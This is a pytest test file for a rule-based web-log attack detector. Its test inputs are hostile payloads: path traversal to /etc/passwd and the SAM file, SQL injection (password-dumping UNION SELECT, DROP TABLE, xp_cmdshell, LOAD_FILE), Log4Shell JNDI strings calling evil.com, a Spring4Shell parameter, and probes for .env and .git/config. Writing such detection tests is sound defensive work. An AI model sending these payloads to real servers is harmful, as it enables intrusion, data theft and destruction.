# tests/test_rule_detector.py
"""Tests for rule-based attack detection.

Covers all attack categories: path_traversal, sqli, dir_scan, cve.
Also verifies no false positives on normal traffic samples.
"""
import sys
import os
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from datetime import datetime, timezone
from src.ingestion.schema import NormalizedLog
from src.detection.rule_based.detector import RuleDetector, RuleResult


@pytest.fixture
def detector():
    return RuleDetector()


def _make_log(
    path: str = "/index.html",
    query_string: str | None = None,
    user_agent: str | None = "Mozilla/5.0",
    status_code: int = 200,
    method: str = "GET",
) -> NormalizedLog:
    """Helper to create a NormalizedLog with defaults."""
    return NormalizedLog(
        timestamp=datetime(2024, 3, 13, 14, 23, 45, tzinfo=timezone.utc),
        source_ip="192.168.1.100",
        method=method,
        path=path,
        status_code=status_code,
        source="nginx",
        user_agent=user_agent,
        query_string=query_string,
    )


# ─── Path Traversal ──────────────────────────────────────────────

class TestPathTraversal:
    def test_basic_traversal(self, detector):
        log = _make_log(path="/../../etc/passwd")
        result = detector.score(log)
        assert result.score >= 0.7
        assert "path_traversal" in result.attack_types

    def test_deep_traversal(self, detector):
        log = _make_log(path="/files/../../../../etc/hosts")
        result = detector.score(log)
        assert result.score >= 0.7

    def test_double_dot_slash(self, detector):
        log = _make_log(path="/....//....//etc/passwd")
        result = detector.score(log)
        assert result.score >= 0.7

    def test_traversal_in_query(self, detector):
        log = _make_log(path="/download", query_string="file=../../../etc/passwd")
        result = detector.score(log)
        assert result.score >= 0.6
        assert "path_traversal" in result.attack_types

    def test_windows_traversal(self, detector):
        log = _make_log(path="/../../../windows/system32/config/sam")
        result = detector.score(log)
        assert result.score >= 0.7


# ─── SQL Injection ────────────────────────────────────────────────

class TestSQLInjection:
    def test_or_based(self, detector):
        log = _make_log(path="/search", query_string="id=1 OR 1=1")
        result = detector.score(log)
        assert result.score >= 0.7
        assert "sqli" in result.attack_types

    def test_string_based(self, detector):
        log = _make_log(path="/search", query_string="id=1' OR '1'='1")
        result = detector.score(log)
        assert result.score >= 0.7

    def test_union_select(self, detector):
        log = _make_log(path="/search", query_string="q=1 UNION SELECT username,password FROM users--")
        result = detector.score(log)
        assert result.score >= 0.85

    def test_drop_table(self, detector):
        log = _make_log(path="/products", query_string="id=1; DROP TABLE users--")
        result = detector.score(log)
        assert result.score >= 0.7

    def test_sleep_injection(self, detector):
        log = _make_log(path="/api/user", query_string="id=1 AND SLEEP(5)")
        result = detector.score(log)
        assert result.score >= 0.7

    def test_xp_cmdshell(self, detector):
        log = _make_log(path="/api/data", query_string="filter=1;EXEC xp_cmdshell 'dir'")
        result = detector.score(log)
        assert result.score >= 0.9

    def test_load_file(self, detector):
        log = _make_log(path="/search", query_string="q=1' UNION SELECT LOAD_FILE('/etc/passwd')--")
        result = detector.score(log)
        assert result.score >= 0.85

    def test_information_schema(self, detector):
        log = _make_log(
            path="/search",
            query_string="q=' UNION ALL SELECT NULL,table_name FROM information_schema.tables--",
        )
        result = detector.score(log)
        assert result.score >= 0.80


# ─── Directory Scanning ──────────────────────────────────────────

class TestDirScan:
    def test_wp_admin(self, detector):
        log = _make_log(path="/wp-admin/")
        result = detector.score(log)
        assert result.score >= 0.5
        assert "dir_scan" in result.attack_types

    def test_phpmyadmin(self, detector):
        log = _make_log(path="/phpmyadmin/")
        result = detector.score(log)
        assert result.score >= 0.5

    def test_git_config(self, detector):
        log = _make_log(path="/.git/config")
        result = detector.score(log)
        assert result.score >= 0.5

    def test_env_file(self, detector):
        log = _make_log(path="/.env")
        result = detector.score(log)
        assert result.score >= 0.5

    def test_backup(self, detector):
        log = _make_log(path="/backup/")
        result = detector.score(log)
        assert result.score >= 0.5

    def test_scanner_user_agent(self, detector):
        log = _make_log(
            path="/anything",
            user_agent="Mozilla/5.0 (compatible; DirBuster/1.0)",
        )
        result = detector.score(log)
        assert result.score >= 0.6
        assert "dir_scan" in result.attack_types

    def test_nikto_ua(self, detector):
        log = _make_log(
            path="/some-page",
            user_agent="Mozilla/5.0 (compatible; Nikto/2.1.6)",
        )
        result = detector.score(log)
        assert result.score >= 0.6


# ─── CVE Exploits ────────────────────────────────────────────────

class TestCVE:
    def test_telerik_webresource(self, detector):
        log = _make_log(path="/Telerik.Web.UI.WebResource.axd")
        result = detector.score(log)
        assert result.score >= 0.9
        assert "cve" in result.attack_types

    def test_telerik_dialoghandler(self, detector):
        log = _make_log(path="/Telerik.Web.UI.DialogHandler.aspx")
        result = detector.score(log)
        assert result.score >= 0.9

    def test_liferay_jsonws(self, detector):
        log = _make_log(path="/api/jsonws/invoke", method="POST")
        result = detector.score(log)
        assert result.score >= 0.9

    def test_liferay_portal(self, detector):
        log = _make_log(path="/c/portal/json_service", method="POST")
        result = detector.score(log)
        assert result.score >= 0.9

    def test_log4shell_ua(self, detector):
        log = _make_log(
            path="/api/test",
            user_agent="${jndi:ldap://evil.com/a}",
        )
        result = detector.score(log)
        assert result.score >= 0.95
        assert "cve" in result.attack_types

    def test_log4shell_obfuscated(self, detector):
        log = _make_log(
            path="/api/test",
            user_agent="${${lower:j}ndi:ldap://evil.com/a}",
        )
        result = detector.score(log)
        assert result.score >= 0.95

    def test_spring4shell(self, detector):
        log = _make_log(
            path="/spring-app",
            query_string="class.module.classLoader.resources.context.parent.pipeline.first.pattern=X",
        )
        result = detector.score(log)
        assert result.score >= 0.9


# ─── Normal Traffic (No False Positives) ──────────────────────────

class TestNormalTraffic:
    def test_homepage(self, detector):
        log = _make_log(path="/")
        result = detector.score(log)
        assert result.score == 0.0

    def test_static_image(self, detector):
        log = _make_log(path="/image/60844/productModel/200x200")
        result = detector.score(log)
        assert result.score == 0.0

    def test_product_page(self, detector):
        log = _make_log(path="/product/7966", query_string="model=9893")
        result = detector.score(log)
        assert result.score == 0.0

    def test_filter_page(self, detector):
        log = _make_log(path="/filter/b1,p62")
        result = detector.score(log)
        assert result.score == 0.0

    def test_normal_user_agent(self, detector):
        log = _make_log(
            path="/index.html",
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/71.0.3578.98",
        )
        result = detector.score(log)
        assert result.score == 0.0

    def test_favicon(self, detector):
        log = _make_log(path="/favicon.ico", status_code=200)
        result = detector.score(log)
        assert result.score == 0.0

    def test_settings_logo(self, detector):
        log = _make_log(path="/settings/logo")
        result = detector.score(log)
        assert result.score == 0.0
